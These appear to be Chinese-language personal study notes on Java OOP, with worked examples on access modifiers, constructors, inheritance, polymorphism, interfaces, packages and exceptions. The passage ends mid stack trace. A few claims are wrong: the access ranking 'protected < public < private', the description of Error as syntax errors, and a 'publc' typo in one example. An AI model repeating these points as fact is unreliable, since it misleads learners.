访问控制符    | 意义                                          |\n| ------------- | --------------------------------------------- |\n| public        | 可以通过外部访问方式访问类内部的public成员    |\n| private       | 不可以通过外部访问方式访问类内部的private成员 |\n| protected     |                                               |\n| default(默认) |                                               |\n\n权限高低：protected < public < private\n\n```java\nclass A\n{\n    private int i;\n    public int j;\n    protected int m;\n    \n    private void f()\n    {\n        i = 1;\n        j = 2;\n        m = 3;\n        k();\n        g();\n    }\n    protected void k()\n    {\n        i = 1;\n        j = 2;\n        m = 3;\n        f();\n        g();\n    }\n    public void g()\n    {\n        i = 1;\n        j = 2;\n        m = 3;\n        f();\n        k();\n    }\n}\nclass TestAccess\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        //aa.i = 10;//不可行，因为i是私有的\n        aa.j = 20;//可以，因为j是公有的\n        aa.m = 22;//可以，因为m是保护型的\n    }\n}\n```\n\n不同访问控制符\n\n|                      | public | protected | default | private |\n| -------------------- | ------ | --------- | ------- | ------- |\n| 同包同类             | √      | √         | √       | √       |\n| 同包不同类           | √      | √         | √       |         |\n| 同包不同类继承       | √      | √         | √       |         |\n| 不同包继承           | √      | √         |         |         |\n| 不同包无任何关系的类 | √      |           |         |         |\n\n包相当于文件夹，类相当于文件。\n\n# 构造函数\n\n构造函数要跟类名一样，构造函数没有返回值。\n\n```java\nclass A\n{\n    private int i;\n    private int j;\n    \n    //构造函数\n    public A(int a, int b)\n    {\n        i = a;\n        j = b;\n        System.out.printf(\"有参构造函数被调用了！\\n\");\n    }\n    //构造函数\n    public A()\n    {\n        System.out.printf(\"无参构造函数被调用了！\\n\");\n    }\n    //方法\n    public void show()\n    {\n        System.out.printf(\"i = %d, j = %d\\n\",i ,j);\n    }\n}\n\nclass TestConst\n{\n    public static void main(String[] args)\n    {\n        A aa = new A(1, 2);//在定义时赋值，相当于int i = 0;\n        aa.show();\n        A ab = new A();\n        ab.show();//正确，默认i=0,j=0,因为i和j不在函数内部，不是局部变量，而是类的属性\n        \t\t\t//boolean类型默认为flase，用%b输出\n        int k;\n        System.out.printf(\"%d\\n\", k);//错误，k是局部变量，未初始化，在java里面局部变量在使用前需初始化，否则报错\n    }\n}\n```\n\n# 函数的重载\n\n同名的函数通过不同的形参做类似的事情。\n\n函数重载要求：\n\n1. 函数的形参个数\n2. 函数的形参顺序\n3. 函数的形参数据类型\n\n这三个至少有一个是不一样的。\n\n```java\nclass Testadd\n{\n    static int add(int a, int b)\n    {\n        return a + b;\n    }\n    \n    static int add(int a, int b, int c)\n    {\n        return a + b + c;\n    }\n    \n    static double add(double a, double b)\n    {\n        return a + b;\n    }\n    \n    public static void main(String args[])\n    {\n        System.out.printf(\"%d\\n\",add(1,2));\n        System.out.printf(\"%d\\n\",add(1,2,3));\n        System.out.printf(\"%f\\n\",add(1.2,2.4));\n    }\n}\n```\n\n# 关键字\n\n## this指针\n\n```java\nclass A\n{\n    public int i;\n    public A(int j)\n    {\n        i = j; \n    }\n    public void show(/* A * this*/)//①this代表当前正在调用show方法的对象\n    {\n        System.out.printf(\"i = %d\\n\",/*(*this).*/i);\n    }\n}\n\npublic class TestThis\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A(10);\n        A aa2 = new A(20);\n        aa1.show();//aa1.show(aa1);\n        aa2.show();//aa2.show(aa2);\n    }\n}\n```\n\naa1和aa2在内存中分别由各自的数据成员i，但是aa1和aa2公用show()方法，show方法如何知道输出的i应该是哪个对象中的i？实际上每个非static方法中都隐含着一个this指针，指向当前正在调用该方法的对象。\n\n```java\nclass A\n{\n    public int i = 99;\n    public A(int i)\n    {\n        System.out.printf(\"%d\\n\", i);//输出2\n    }\n}\npublic class TestThis_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A(2);\n        System.out.printf(\"%d\\n\", aa.i);//输出99\n    }\n}\n```\n\n```java\nclass A\n{\n    public int i = 99;\n    public A(int i)\n    {\n   \t \tthis.i = i;//②this代表当前时刻正在创建的对象，即this.i是属性，i是局部变量\n        System.out.printf(\"%d\\n\", i);//输出2\n    }\n}\npublic class TestThis_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A(2);\n        System.out.printf(\"%d\\n\", aa.i);//输出2\n    }\n} \n```\n\n## static\n\n```java\nclass A \n{\n    public static int i = 10;//①在属性前加static，意味着所有对象都共用一个属性\n    public void show()\n    {\n        System.out.printf(\"%d\\n\",i);\n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A();\n        A aa2 = new A();\n        aa1.i = 20;\n        aa2.show();//输出20，意味着aa1.i与aa2.i是同一个        \n    }\n}\n```\n\n```java\nclass A \n{\n    public static int i = 10;//②在属性前加static，没有对象也仍然可以通过类名的方式访问内部的static属性\n    public static void f()\n    {//方法也可以访问\n        System.out.printf(\"2022年1月20日\\n\");\n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        System.out.printf(\"%d\\n\",A.i);//输出10\n        A.f();//输出日期\n        A aa = new A();\n        aa.f();//输出日期\n        System.out.printf(\"%d\\n\",aa.i);//输出10\n    }\n}\n```\n\n```java\nclass A \n{\n    public static int i = 10;\n    private static void f()//③static可以通过类名访问，但是在非private的情况下才可以访问\n    {\n        System.out.printf(\"2022年1月20日\\n\");\n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        System.out.printf(\"%d\\n\",A.i);//输出10\n        A.f();//错误\n    }\n}\n```\n\n```java\nclass A \n{\n    public static int i = 10;\n    public static void f()\n    {\n        //g();//④静态方法不能访问非静态成员\n        System.out.printf(\"2022年1月20日\\n\");\n    }\n    public void g()\n    {\n        f();//非静态方法可以访问静态成员\n        System.out.printf(\"GGGG\\n\");\n    }\n}\n```\n\n用static求出由某个类造出几个对象：\n\n```java\nclass A\n{\n    private int i;\n    private static int cnt = 0;\n    public A()\n    {\n        ++cnt;\n    }\n    public A(int i)\n    {\n        this.i = i;\n        ++cnt;\n    }\n    public static int getCnt()\n    {\n        return cnt;//返回的是A对象的个数,静态属性不能加this，所以不能写this.cnt\n    }\n}\n\npublic class TestStatic\n{\n    public static void main(String[] args)\n    {\n        System.out.printf(\"%d\\n\",A.getCnt());//输出0\n        A aa1 = new A();\n        System.out.printf(\"%d\\n\",A.getCnt());//输出1\n        A aa2 = new A(2);\n        System.out.printf(\"%d\\n\",A.getCnt());//输出2\n    }\n}\n```\n\n某类只能造一个对象：\n\n```java\nclass A\n{\n    public int i = 20;\n    private static A aa = new A();//aa是A类的属性也是A类造出的对象\n    private A()\n    {//将构造函数私有，使得外部不能new出一个对象\n       \n    }\n    public static A getA()\n    {//通过这个方法只能调用A类里面构造的对象\n        return aa;\n    }\n}\n\npublic class TestStatic_2\n{\n    public static void main(String[] args)\n    {\n        //A aa1 = new A();//错误\n        A aa1 = A.getA();\n        A aa2 = A.getA();\n        aa1.i = 99;\n        System.out.printf(\"%d\\n\",aa2.i);//输出99，也就是说aa1和aa2是同一个\n    }\n}\n```\n\n一个类的属性可以是个类对象：\n\n```java\nclass A\n{\n\tpublic void f()\n    {\n        System.out.printf(\"哈哈\\n\");\n    }\n}\nclass C\n{\n\tpublic int i;\n\tpublic A aa = new A();//aa一定是个对象，aa也是C类的属性\n    public void g()\n    {//g()方法可以访问aa\n        aa.f();\n    }\n}\nclass M\n{\n\tpublic static void main(String[] args)\n    {\n        C cc = new C();\n        cc.g();\n    }\n}\n```\n\n# 继承\n\n```java\nclass human\n{\n    public String name;\n    public int age;\n}\nclass student\n{\n    public String name;\n    public int age;\n    public double score;\n}\nclass graduate\n{\n    public String name;\n    public int age;\n    public double score;\n    public String tutor;\n}\n```\n\n这样写很累赘，因为人包括学生，学生包括研究生，所以利用继承是一个很好的方法。\n\n```java\nclass human\n{\n    public String name = \"张三\";\n    public int age = 22;\n}\nclass student extends human\n{\n    public double score = 99.9;\n}\nclass graduate extends student\n{\n    public String tutor = \"李四\";\n}\npublic class TestExtends\n{\n    public static void main(String[] args)\n    {\n        graduate gd = new graduate();\n        System.out.printf(\"%s %f\\n\",gd.name, gd.score);//输出正确\n    }\n}\n```\n\n```java\nclass A\n{\n    public int i;\n    protected int j;\n    private int k;\n    public void g()\n    {}\n    private void s()\n    {}\n    protected void b()\n    {}\n}\nclass B extends A\n{\n    public void f()\n    {\n        i = 10;\n        j = 20;\n        //k = 30;//错误，私有属性不能被继承\n        g();\n        //s();//错误，私有方法不能被继承\n        b();\n    }\n    private void m()\n    {\n        i = 10;\n        j = 20;\n        //k = 30;//错误，私有属性不能被继承\n        g();\n        //s();//错误，私有方法不能被继承\n        b();\n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        B bb = new B();\n        bb.i = 20;\n        bb.j = 30;\n        bb.b();\n        bb.g();\n        //bb.s();//错误\n        //bb.k();//错误，通过子类对象名只能访问从父类继承过来的非private成员\n      //私有不能被继承，私有从物理上会被继承，但是程序员不能访问，因此继承要慎重，否则会浪费内存\n    }\n}\n```\n\n```java\nclass A\n{\n    public static int i = 20;\n    protected int j;\n    private int k;\n}\nclass B extends A\n{\n    private void g()\n    {\n        \n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        B.i = 99;\n        System.out.printf(\"%d\\n\",B.i);//输出99，说明可以A.i，也可以通过继承实现B.i\n    }\n}\n```\n\n子类访问父类成员的三种方式：\n\n1. 在子类内部访问父类成员\n2. 通过子类对象名访问父类成员\n3. 通过子类的类名访问父类成员\n\n Java只支持单继承，不允许多继承。单继承就是一个类只能有一个父类。\n\n子类可以继承父类所有成员变量和成员方法，但子类永远也无法继承父类的构造函数。在子类的构造方法中可使用语句super(参数列表)调用父类的构造方法。\n\n```java\nclass A\n{\n    public int i;\n    public int j;\n    public A()\n    {\n        \n    }\n    public A(int i, int j)\n    {\n        this.i = i;\n        this.j = j;\n    }\n}\nclass B extends A\n{\n    public int k;\n    public B()\n    {\n        \n    }\n    public B(int i, int j, int k)\n    {//只写int k不对，因为B类包括A类的属性，所以一共三个\n        this.i = i;//i,j可以用this，因为B类继承了A类的属性\n        this.j = j;//即A类属性已经包含在B类中\n        //如果A类有100个属性，不可能一直这么写，要用super\n        this.k = k;\n    }\n}\npublic class TestSuper\n{\n    public static void main(String[] args)\n    {\n        B bb = new B(1,2,3); \n    }\n}\n```\n\n```java\nclass A\n{\n    public int i;\n    public int j;\n    public A()\n    {\n        \n    }\n    public A(int i, int j)\n    {\n        this.i = i;\n        this.j = j;\n    }\n}\nclass B extends A\n{\n    public int k;\n    public B()\n    {\n        \n    }\n    public B(int i, int j, int k)\n    {//只写int k不对，因为B类包括A类的属性，所以一共三个\n        //A(i, j);//错误，父类构造函数无法继承\n        super(i, j);//正确\n        this.k = k;\n        //super(i, j);//错误，super要放在构造函数的第一个语句\n    }\n}\npublic class TestSuper\n{\n    public static void main(String[] args)\n    {\n        B bb = new B(1,2,3); \n        System.out.printf(\"%d,%d\\n\",bb.i,bb.j);\n    }\n}\n```\n\n```java\nclass A\n{\n    public int i;\n}\nclass B\n{\n    public int j;\n    public B(int i, int j)\n    {\n        //super();③如果只写this.j = j就默认调用super();\n        //super(i);//②错误，A类没有只有一个参数的构造函数\n        //④不能同时调用两个构造函数\n        this.j = j;\n    }\n    public void f(int i)\n    {\n        //super(i);//①错误，方法不能调用父类的构造函数\n    }\n}\npublic class TestSuper_2\n{\n    public static void main(String[] args)\n    {\n        \n    }\n}\n```\n\n# 重写父类的方法\n\n```java\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\nclass B extends A\n{\n    public void f()\n    {\n        //f();//死递归\n        super.f();//调用从父类继承过来的f方法\n        System.out.printf(\"BBBB\\n\");\n    }\n}\npublic class TestOver\n{\n    public static void main(String[] args)\n    {\n        B bb = new B();\n        bb.f();//输出AAAA\\nBBBB\\n\n    }\n}\n```\n\n```java\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n    public void f(int i)\n    {\n        System.out.printf(\"hhhh\\n\");\n    }\n}\nclass B extends A\n{\n    public void f()\n    {\n        super.f();//调用从父类继承过来的f方法\n        f(10);//正确，因为B类没有f(int i)所以去A类找，也可以写成super.f(10);\n        System.out.printf(\"BBBB\\n\");\n    }\n}\npublic class TestOver\n{\n    public static void main(String[] args)\n    {\n        B bb = new B();\n        bb.f();//输出AAAA\\nhhhh\\nBBBB\\n\n    }\n}\n```\n\n```java\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    } \n}\nclass B extends A\n{\n    private void f()\n    {//重写只能权限相等或更高\n        System.out.printf(\"BBBB\\n\");\n    }\n}\npublic class TestOver\n{\n    public static void main(String[] args)\n    {\n        B bb = new B();\n        bb.f();\n    }\n}\n```\n\n方法重写指在子类中重新定义父类中已有的方法。重写方法必须和被重写方法具有相同的方法名称、参数列表和返回值类型。\n\n```java\nclass human\n{\n    private String name;\n    private int age;\n    public human()\n    {\n        \n    }\n    public human(String name, int age)\n    {\n        this.name = name;\n        this.age = age;\n    }\n    public void setName(String name)\n    {\n        this.name = name;\n    }\n    public void setAge(int age)\n    {\n        this.age = age;\n    }\n    public String getInfor()\n    {\n        String strInf = name + \": \" +age;\n        return strInf;\n    }\n}\nclass student extends human\n{\n    public String school;\n    public student()\n    {}\n    public student(String name, int age, String school)\n    {\n        super(name, age);\n        this.school = school;\n    }\n    public void setschool(String school)\n    {\n        this.school = school;\n    }\n    public String getInfor()\n    {\n        //String strInf = name + \": \" + age + \": \" + school;//因为name和age都是私有的，所以在student类不能这么写\n        String strInf = super.getInfor() + \": \" + school;\n        return strInf;\n    }\n}\npublic class TestStudent\n{\n    public static void main(String[] args)\n    {\n        student st1 = new student(\"张三\", 22, \"星星大学\");\n        System.out.printf(\"%s\\n\", st1.getInfor());\n    }\n}\n```\n\n# 多态\n\n```java\nclass A\n{\n    protected void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\nclass B extends A\n{\n    public void f()\n    {//重写方法的权限不能低于被重写方法的访问权限，是因为多态的存在\n        System.out.printf(\"BBBB\\n\");\n    }\n}\npublic class TestPoly_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        B bb = new B();\n        aa.f();//输出AAAA\\n\n        aa = bb;//把bb当作aa来看待(把特殊当作一般看待)\n        //bb = aa;//错误\n        aa.f();//输出BBBB\\n\n        //同一条代码做不同的事情，这就是多态\n    }\n}\n```\n\n```java\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\nclass B extends A\n{\n    public void f()\n    {\n        System.out.printf(\"BBBB\\n\");\n    }\n}\nclass C extends B\n{\n    public void f()\n    {\n        System.out.printf(\"CCCC\\n\");\n    }\n}\nclass D extends C\n{\n    public void f()\n    {\n        System.out.printf(\"DDDD\\n\");\n    }\n}\npublic class TestPoly_3\n{\n    public static void g(A aa)\n    {\n        aa.f();\n    }\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        B bb = new B();\n        C cc = new C();\n        D dd = new D();\n        g(aa);\n        g(bb);\n        g(cc);\n        g(dd);\n    }\n}\n```\n\n```java\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\nclass B extends A\n{\n    public void f()\n    {\n        System.out.printf(\"BBBB\\n\");\n    }\n    public void g()\n    {\n    \tSystem.out.printf(\"GGGG\\n\");\n    }\n}\npublic class TestPoly_4\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        B bb = new B();\n        //bb = aa;//如何实现？只有在父类引用本身指向的就是一个子类对象时，才可以把父类引用强制转化为子类引用\n        aa = bb;\n        bb = (B)aa;\n        bb.g();//输出GGGG\\n\n    }\n}\n```\n\n```java\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\nclass B extends A\n{\n    public void f()\n    {\n        System.out.printf(\"BBBB\\n\");\n    }\n    public void g()\n    {\n        System.out.printf(\"GGGG\\n\");\n    }\n}\npublic class TestPoly_4\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        B bb = new B();\n        aa = bb;\n        //aa.g();//错误，只能调用A类和B类的共有部分\n    }\n}\n```\n\n子类对象可以直接赋给父类引用，但父类对象在任何情况下都不可以直接赋给子类使用。通过父类引用只能访问子类对象从父类继承过来的成员，不能访问子类对象所特有的成员。\n\n# 抽象类\n\n抽象类通常用来作为一个类族的最顶层的父类，用最底层的类表示现实中的具体事物，用最顶层的类表示该类族所有事物的共性。\n\n```java\nabstract class A\n{//有抽象方法一定是抽象类\n    abstract public void f();//没有方法体的方法叫做抽象方法，抽象方法要求末尾必须得加分号，前面必须得加abstract\n}\nabstract class B\n{//抽象类不一定要有抽象方法\n    public void g()\n    {}\n}\npublic class TestAbstract\n{\n    public static void main(String[] args)\n    {}\n}\n```\n\n```java\nclass A\n{\n    \n}\nabstract class B extends A\n{//抽象类可以继承非抽象类\n    \n}\npublic class TestAbsPoly\n{\n    public static void main(String[] args)\n    {}\n}\n```\n\n```java\nabstract class A\n{\n    abstract public void f();\n}\nclass B extends A\n{//B类是非抽象类，所以要实现f方法，即要具体写f方法\n    public void f()\n    {\n        System.out.printf(\"BBBB\\n\");\n    }\n}\nabstract class C extends A\n{//C类是抽象类，所以可以不具体实现f方法\n    \n}\npublic class TestAbsPoly\n{\n    public static void main(String[] args)\n    {\n        //A aa = new A();//错误，抽象类不能创建对象\n        B bb = new B();\n        bb.f();//输出BBBB\\n        \n        A aa;//可以定义一个抽象类的引用，但不可以定义一个抽象类的对象\n        aa = bb;//OK\n        aa.f();//输出BBBB\\n，利用多态调用子类的具体实现方法\n    }\n}\n```\n\n# Final\n\nFinal可以修饰\n\n1. 整个类\n2. 类中的若干个属性\n3. 类中的若干个方法：表示该方法可以被子类继承，但不可以被子类重写\n\n```java\n//final class A\nclass A\n{//如果A类是最终的，则不能被继承\n    \n}\nclass B extends A\n{\n    \n}\npublic class TestFinal\n{\n    public static void main(String[] args)\n    {\n        \n    }\n}\n```\n\n```java\nclass A\n{\n    //final public int i;//常变量，变量必须赋一个固定值，以后不能再改变，相当于C语言的const\n    final public int i = 10;\n}\npublic class TestFinal\n{\n    public static void main(String[] args)\n    {\n        \n    }\n}\n```\n\n```java\nclass A\n{\n    final public int i;\n    public A()\n    {//②创建对象一定调用构造函数，所以在构造函数里写正确\n        i = 22;\n    }\n    public void f()\n    {//①f方法可能不被调用，i也就没有赋值\n        //i = 22;//错误\n    }\n}\npublic class TestFinal\n{\n    public static void main(String[] args)\n    {\n        \n    }\n}\n```\n\n# 接口\n\n接口就是抽象方法和常量值的集合。从本质上讲，接口是一种特殊的抽象类。\n\n```java\ninterface It\n{\n    public void f();\n    //public void f()\n    //{}//错误，接口不能有实现方法\n}\nabstract class B\n{\n    public void f()\n    {//抽象类可以有实现方法\n        \n    }\n}\npublic class A\n{\n    public static void main(String[] args)\n    {\n        \n    }\n}\n```\n\n## 接口的注意事项\n\n1. 接口中定义的属性必须是`public static final`的，而接口中定义的方法则必须是`public abstract`的，因此这些修饰符可以部分或全部省略。\n\n   ```java\n   interface It\n   {\n       public static final int i = 20;\n       //可以写成int i = 20;\n       public abstract void f();\n       //可以写成void f();\n   }\n   public class A\n   {\n       public static void main(String[] args)\n       {\n           \n       }\n   }\n   ```\n\n2. 接口中定义的属性的值在实现类中不能被更改。\n\n   ```java\n   interface It\n   {\n       int i = 10;//不能为int i;\n   }\n   class A implements It\n   {\n       public A(int j)\n       {\n           //this.i = j;//错误，接口中的属性值不能被修改\n       }\n   }\n   public class B\n   {\n       public static void main(String[] args)\n       {}\n   }\n   ```\n\n3. 一个类只能实现(`implements`)某个接口，不能继承(`extends`)某个接口。\n\n   ```java\n   interface It\n   {\n       public static final int i = 20;\n       public abstract void f();\n   }\n   abstract class A implements It \n   {//如果接口中有抽象方法且A类没有实现接口的全部方法，A必须为抽象类\n       \n   }\n   class C implements It\n   {//如果没有抽象方法或C类实现接口的全部方法，则可以是非抽象类\n       public void f()\n       {\n           System.out.printf(\"i = %d\\n\", i);\n       }\n   }\n   public class B\n   {\n       public static void main(String[] args)\n       {\n           C cc = new C();\n           cc.f();//输出i = 20\n       }\n   }\n   ```\n\n4. 接口可以继承接口。 \n\n   ```java\n   interface It1\n   {\n       \n   }\n   interface It2\n   {\n       \n   }\n   interface It3 extends It1, It2\n   {\n       \n   }\n   public class C\n   {\n       public static void main(String[] args)\n       {\n           \n       }\n   }\n   ```\n\n5. 接口允许多继承。(看4)\n\n6. 如果一个类只实现了一个接口的部分方法，则该类必须得声明为抽象类。(看3)\n\n7. 一个类可以在继承一个父类的同时实现一个或多个接口，但`extends`关键字必须得在`implements`之前。\n\n   ```java\n   class A\n   {}\n   interface It1\n   {}\n   interface It2\n   {}\n   interface It3 extends It1, It2\n   {}\n   interface It4\n   {\n       int i = 20;\n   }\n   class T extends A implements It4, It3\n   {}\n   public class TestIter\n   {\n       public static void main(String[] args)\n       {}\n   }\n   ```\n\n8. 不可以`new`接口对象，但可以定义一个接口引用类型的变量并将其指向实现接口的对象，达到多态的目的。\n\n   ```java\n   interface It\n   {\n       void f();\n   }\n   class A implements It\n   {\n       public void f()\n       {\n           System.out.printf(\"AAAA\\n\");\n       }\n       public void g()\n       {}\n   }\n   class D\n   {\n       publc static void main(String[] args)\n       {\n           It it;\n           it = new A();\n           it.f();//输出AAAA\\n\n           //it.g();//错误，不能调用子类特有成员\n           //It it2 = new It();//不可以创建接口对象\n       }\n   }\n   ```\n\n## 接口的作用\n\n1. 通过接口可以实现不相关类的相同行为\n2. 接口提供了不同对象进行协作的平台\n3. 接口可以实现多继承，从一个程度上弥补了类只能单继承的缺陷\n4. 接口是我们了解一个类功能的重要途径\n\n# 包\n\n```java\n/** package.java*/\npackage zhangsan.lisi;\n//package语句必须是第一条语句，注释不算\n//把下面的类放在了zhangsan文件夹的子文件夹lisi里面\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        aa.f();\n        //上面等同于下面\n        new A().f();\n    }\n}\n/**\njavac package.java\n如果在命令窗口运行，必须建立一个zhangsan文件夹，在里面建一个lisi子文件夹，把编译好的A.class和M.class放进lisi文件夹里才能正常运行\njava zhangsan.lisi.M\n编译时建议用javac -d . package.java，可以自动建立文件夹，运行同上\n-d表示自动生成包层，.表示这个包层是在当前目录下建立的\n*/\n```\n\n## 同包不同类的相互访问\n\n```java\n//A.java文件\n//package lang;//默认有lang包\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\n```\n\n```java\n//B.java文件\nclass B\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        aa.f();//输出AAAA\\n\n    }\n}\n/**\njavac A.java B.java\njava B\n*/\n```\n\n因为类A和类B默认是在同一个无名的包中，所以彼此可以相互访问。只要是非私有成员都可以被同包的另一个类访问。\n\n## 不同包类的相互访问\n\n```java\n//A.java\npackage zhangsan.lisi;\npublic class A\n{//只有公有的类公有的成员才可以被不同包访问\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\n```\n\n```java\n//B.java\npackage v5le0n9;\n//import zhangsan.lisi.*;//导入包层太多，可以选择直接导入类\nimport zhangsan.lisi.A;\npublic class B\n{\n    public static void main(String[] args)\n    {\n        //A aa = new A();//错误，不在同一个包中\n        //zhangsan.lisi.A aa = new zhangsan.lisi.A();//A类如果是公有的则正确，但一般不这么用，更多用导包，此时，A aa = new A();可用\n        A aa = new A();\n        aa.f();//如果f方法是公有的则正确，输出AAAA\\n\n    }\n}\n/**\njavac -d . A.java B.java或javac -d . B.java A.java\njava v5le0n9.B\n*/\n```\n\n## 不同包的类继承\n\n```java\n//A.java\npackage zhangsan.lisi;\npublic class A\n{\n    public void g()\n    {\n        System.out.printf(\"GGGG\\n\");\n    }\n    protected void b()\n    {\n        System.out.printf(\"BBBB\\n\");\n    }\n}\n```\n\n```java\n//B.java\npackage v5le0n9;\nimport zhangsan.lisi.*;\nclass B extends A\n{\n    public void f()\n    {//在子类内部可以访问从另一个包继承过来的父类的public成员和protected成员\n        g();\n        b();\n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        B bb = new B();\n        bb.f();//输出GGGG\\nBBBB\\n\n        bb.g();//输出GGGG\\n\n        //bb.b();//错误\n        //在子类外部只能访问从另一个包继承过来的父类的public成员而不能访问protected成员\n    }\n}\n```\n\n## 普通jar包的生成\n\n假设需要将`v5le0b9`和`zhangsan`打包，就新建一个文件夹将`v5le0n9`和`zhangsan`放进去，确保文件夹只有需要打包的内容。\n\n在命令窗口进入新文件夹目录，输入`jar -cvf T.jar *`，生成叫作T.jar的包。\n\n## 如何使用jar包中的类\n\n```java\nimport zhangsan.lisi.A;//导入即可\npublic class Test\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        aa.g();\n    }\n}\n```\n\n如果jar包和新编辑的java文件不在同一个目录下，则在命令窗口编译前，先设置classpath，再编译运行。\n\n```java\nset classpath=xxxx\\xxx\\T.jar;//jar包的绝对路径\n```\n\n# 异常\n\n```java\npackage v5le0n9;\nclass A\n{\n    int divide(int a, int b)\n    {\n        int m;\n        m = a / b;\n        return m;\n    }\n}\npublic class TestExcep\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        aa.divide(6, 2);//正确\n        //aa.divide(6, 0);//异常\n        System.out.printf(\"看得见我吗？\");//上一句异常直接终止程序，所以这一条不输出\n    }\n}\n/**\nException in thread \"main\" java.lang.ArithmeticException: / by zero\n\tat v5le0n9.A.divide(TestConst.java:7)\n\tat v5le0n9.TestConst.main(TestConst.java:17)\n*/\n```\n\n```java\npackage v5le0n9;\nclass A\n{\n    int divide(int a, int b)\n    {\n        int m;\n        m = a / b;\n        return m;\n    }\n}\npublic class TestExcep_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        try\n        {\n            aa.divide(6, 0);\n        }\n        catch(ArithmeticException e)//算数异常，e用来接收第18行抛出的异常对象，如果不知道try语句抛出什么异常，直接写Exception e也可\n        {//如果try里面的语句出错，则输出\n            System.out.printf(\"除数不能为零\\n\");\n        }\n        System.out.printf(\"看得见\");//上面try和catch捕捉到异常，然后继续往下执行，正常输出\n    }\n}\n/**\n除数不能为零\n看得见\n*/\n```\n\n```java\npublic class TestExcep_3\n{\n    public static void main(String[] args)\n    {\n        int m;\n        try\n        {\n            m = 2;\n            System.out.printf(\"m = %d\\n\", m);//正确\n        }\n        catch(Exception e)\n        {\n            \n        }\n        //System.out.printf(\"m = %d\\n\", m);//错误，可能未初始化变量\n        //放在try里面的语句很有可能执行不成功，编译器做最坏的打算，即没有赋值\n    }\n}\n```\n\n```java\npackage v5le0n9;\nclass A\n{\n    int divide(int a, int b)\n    {\n        //int m;\n        int m = 0;\n        try\n        {\n            m = a / b;\n        }\n        catch(ArithmeticException e)\n        {\n            System.out.printf(\"除数不能为零\\n\");\n        }\n        return m;//错误，可能未初始化变量，所以要给m赋个初始值\n    }\n}\npublic class TestExcep_4\n{\n    public static void main(String[] args)\n    {\n        new A().divide(6, 0);\n    }\n}\n```\n\nError和Exception的区别：Error表示语法错误，而Exception表示程序运行时出现的错误。\n\n## 为什么需要异常\n\n根据上面那个例子，用if...else...语句也可实现，所以为什么需要异常？\n\n```java\nimport java.util.*;//导入util包才能用Scanner\npublic class TestExcep_5\n{\n    public static void main(String[] args)\n    {\n        int i;\n        Scanner sc = new Scanner(System.in);//System.in表示键盘输入\n        i = sc.nextInt();//黑窗口输入一个Int数据类型赋值给i\n        System.out.printf(\"i = %d\\n\", i);//输出\n    }\n}\n/**\n86\ni = 86\n*/\n```\n\n假如输入的不是整型，会报异常。此时，用if...else...语句显得很困难。\n\n```java\n/**\nqwe\nException in thread \"main\" java.util.InputMismatchException\n\tat java.util.Scanner.throwFor(Unknown Source)\n\tat java.util.Scanner.next(Unknown Source)\n\tat java.util.Scanner.nextInt(Unknown Source)\n\tat java.util.Scanner.nextInt(Unknown Source)\n\tat v5le0n9.TestConst.main(TestConst.java:9)\n*/\n```\n\n```java\nimport java.util.*;//导入util包才能用Scanner\npublic class TestExcep_6\n{\n    public static void main(String[] args)\n    {\n        int i;\n        Scanner sc = new Scanner(System.in);//System.in表示键盘输入\n        try\n        {\n            i = sc.nextInt();//终端输入一个Int数据类型赋值给i\n            System.out.printf(\"i = %d\\n\", i);//输出\n        }\n        catch(InputMismatchException e)\n        {//从上面的报错可以看到是输入匹配数据类型异常\n            System.out.printf(\"输入数据不合法\\n\");\n        }        \n    }\n}\n/**\nqwe\n输入数据不合法\n*/\n```\n\n## 异常的处理机制\n\n1. 当Java程序运行时出现问题时，系统会自动检测到该错误，并立即生成一个与该错误对应的异常对象。\n2. 然后把该异常对象提交给Java虚拟机。\n3. Java虚拟机会自动寻找相应的处理代码来处理这个异常，如果没有找到，则由Java虚拟机做一些简单的处理后，程序被强行终止。\n4. 程序员可以自己编写代码来捕捉可能出现的异常，并编写代码来处理相应的异常。\n\n```java\npackage v5le0n9;\nclass A\n{\n    int divide(int a, int b)\n    {\n        return a / b;\n    }\n    public void f()\n    {\n        g();\n    }\n    public void g()\n    {\n        divide(6, 0);\n    }\n}\npublic class TestExcep_7\n{\n    public static void main(String[] args)\n    {\n        new A().f();\n    }\n}\n/**\nException in thread \"main\" java.lang.ArithmeticException: / by zero\n\tat v5le0n9.A.divide(TestConst.java:6)\n\tat v5le0n9.A.g(TestConst.java:14)\n\tat v5le0n9.A.f(TestConst.java:10)\n\tat 